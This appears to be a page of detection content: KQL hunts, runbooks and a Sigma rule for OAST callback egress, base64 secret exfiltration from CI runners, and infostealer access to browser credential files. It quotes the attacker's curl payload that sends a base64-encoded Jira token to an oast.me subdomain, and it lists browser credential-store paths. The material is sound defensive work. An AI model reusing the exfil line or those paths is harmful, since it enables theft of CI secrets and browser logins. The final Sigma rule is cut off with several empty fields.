Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Egress to Interactsh/OAST out-of-band callback domains (*.oast.me family) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Credential exfil via shell command injection: base64-encoded secrets curled to OAST domain · Infostealer — non-browser process accessing browser cookie/login DBs
Egress to Interactsh/OAST out-of-band callback domains (*.oast.me family) AICommand & Control High
Hunts network/DNS resolution to ProjectDiscovery Interactsh out-of-band interaction domains (oast.me/oast.pro/oast.live/oast.site/oast.online/oast.fun/interact.sh/interactsh.com/oastify.com). In this campaign the Snowflake GitHub Actions injection triggered an out-of-band callback to a *.oast.me subdomain; any org-managed host or self-hosted CI runner resolving these domains indicates OOB vulnerability exploitation (or an unsanctioned pentest) against your own assets. Rationale: The article's sole confirmed IOC is a *.oast.me subdomain callback; Wiz's writeup shows the curl exfil hit https://subdomain.oast.me. Cross-checked the full OAST domain family (oast.me/pro/live/site/online/fun/interact.sh/interactsh.com) against ProjectDiscovery Interactsh docs and GreyNoise's OAST report, so the family match is high-fidelity and not just the single article-cited host. Cross-checked against: • https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug • https://github.com/projectdiscovery/interactsh • https://www.labs.greynoise.io/grimoire/2026-01-24-weekly-oast-report/
ATT&CKT1071.001 T1041
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized penetration test or bug-bounty engagement using Nuclei/Interactsh against org assets
  • Internal AppSec/DAST tooling running Interactsh-based OOB checks in CI/CD
  • Security researcher on the corporate network testing their own Interactsh payloads
  • Red-team exercise using ProjectDiscovery tooling
  • A developer manually reproducing a public PoC that references an oast.me URL
Suppression filter
| where not (DeviceName in~ ("pentest-runner01","appsec-scanner01") and InitiatingProcessFileName in~ ("nuclei.exe","nuclei","interactsh-client","interactsh-client.exe"))
Response runbook
1) TRIAGE: Identify the resolving host and the initiating process (InitiatingProcessCommandLine / ContextImageFileName). Determine whether it is a self-hosted CI runner, a web/app server, or a workstation, and check for an approved pentest/bug-bounty window covering this asset. 2) CONTAIN: If unsanctioned, isolate the host, and on any exposed CI runner immediately rotate every secret the runner could read (API tokens, cloud keys, registry creds) — assume OOB callback == successful blind injection. 3) HUNT: Pivot on the source host for the preceding request that triggered the callback (web/IIS/app logs, GitHub Actions run logs, WAF), and search for the same OAST subdomain in inbound HTTP parameters, issue/PR titles, and log4j-style injection points.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where isnotempty(RemoteUrl)
| where RemoteUrl has_any ("oast.me","oast.pro","oast.live","oast.site","oast.online","oast.fun","interact.sh","interactsh.com","oastify.com")
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
DnsEvents
| where TimeGenerated > ago(30d)
| where Name has_any ("oast.me","oast.pro","oast.live","oast.site","oast.online","oast.fun","interact.sh","interactsh.com","oastify.com")
| project TimeGenerated, Computer, ClientIP, Name, QueryType, QueryTypeName
| order by TimeGenerated desc

Credential exfil via shell command injection: base64-encoded secrets curled to OAST domain AIActions on Objectives High
Hunts the exact exfil primitive from the Snowflake GitHub Actions injection: a curl/wget request to an Interactsh OAST domain whose query string carries base64-encoded environment secrets (e.g. printf %s $JIRA_API_TOKEN | base64 -w0). Targets self-hosted CI/CD runners and Linux hosts where process/command-line telemetry is available, catching the injection payload itself rather than only the network beacon. Rationale: Built directly from Wiz's quoted payload: curl -s "https://subdomain.oast.me?t=`printf %s $JIRA_API_TOKEN|base64 -w0`..." — combining the OAST domain family with the base64/printf secret-encoding primitive isolates the exfil step (a distinct process-tree pivot from the DNS-egress UC). The base64-of-env-var + OOB-domain pairing is high-fidelity because legitimate automation rarely encodes secrets into an interact.sh URL. Cross-checked against: • https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug • https://github.com/projectdiscovery/interactsh
ATT&CKT1041 T1132.001 T1059.004
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Nuclei/Interactsh DAST templates that legitimately construct base64 OOB test payloads during an approved scan
  • Security engineer manually testing an OOB payload on a lab/self-hosted runner
  • Bug-bounty tooling replaying a public PoC that includes the oast.me curl one-liner
  • CI job intentionally exercising an OOB detection self-test
  • Red-team C2 staging that reuses Interactsh domains (true positive, but expected during a sanctioned exercise)
Suppression filter
| where not (DeviceName in~ ("appsec-scanner01","dast-runner01") or InitiatingProcessFileName in~ ("nuclei","nuclei.exe","interactsh-client"))
Response runbook
1) TRIAGE: Pull the full ProcessCommandLine and parent process (ParentProcessName / InitiatingProcessCommandLine). Confirm whether the parent is a CI/CD runner agent (Runner.Worker, actions-runner, gitlab-runner) — that strongly implies a workflow-injection exploit, not user activity. Decode the base64 query params to see which secrets left. 2) CONTAIN: Rotate every secret referenced or reachable in that command/runner (Jira/API tokens, cloud keys), isolate the runner, and freeze the associated pipeline/branch. 3) HUNT: Review the triggering workflow YAML for unsafe ${{ github.event.*.title/body }} interpolation inside run: blocks, enumerate other repos/workflows with the same pattern, and search GitHub audit/workflow logs for issue or PR events immediately preceding the runner's outbound request.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has_any ("oast.me","oast.pro","oast.live","oast.site","oast.online","oast.fun","interact.sh","interactsh.com","oastify.com")
| extend HasEncode = ProcessCommandLine has_any ("base64","printf %s","xxd")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, HasEncode, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessCommandLine has_any ("oast.me","oast.pro","oast.live","oast.site","oast.online","oast.fun","interact.sh","interactsh.com","oastify.com")
| extend HasEncode = ActingProcessCommandLine has_any ("base64","printf %s","xxd")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, HasEncode, ParentProcessName, ParentProcessCommandLine
| order by TimeGenerated desc

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:

logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'

    filter_browser:

            - '\chrome.exe'
            - '\msedge.exe'

falsepositives:
